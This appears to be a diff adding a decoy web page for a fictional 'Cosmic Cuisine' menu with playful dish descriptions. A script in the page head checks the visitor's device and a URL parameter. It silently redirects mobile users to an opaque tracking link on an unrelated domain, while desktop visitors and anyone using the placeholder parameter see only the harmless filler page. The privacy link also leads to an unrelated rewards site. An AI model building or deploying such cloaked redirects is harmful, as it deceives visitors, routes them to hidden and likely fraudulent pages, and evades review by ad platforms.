@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quirky Cosmic Cuisine</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        header {
+            background-color: #ff9900;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .cosmic-dish {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #6600cc;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ffff00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🌟 Cosmic Cuisine Extravaganza 🌟</h1>
+    </header>
+    <main>
+        <div class="cosmic-dish">
+            <h2>Nebula Noodles</h2>
+            <p>Slurp the stars with our galactic pasta!</p>
+        </div>
+        <div class="cosmic-dish">
+            <h2>Meteor Meatballs</h2>
+            <p>Savory spheres from the asteroid belt!</p>
+        </div>
+        <div class="cosmic-dish">
+            <h2>Supernova Soup</h2>
+            <p>Explosive flavors in every spoonful!</p>
+        </div>
+        <div class="cosmic-dish">
+            <h2>Quantum Quiche</h2>
+            <p>A slice of parallel universe deliciousness!</p>
+        </div>
+    </main>
+    <footer>
+        <p>© 2023 Cosmic Cuisine Extravaganza | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
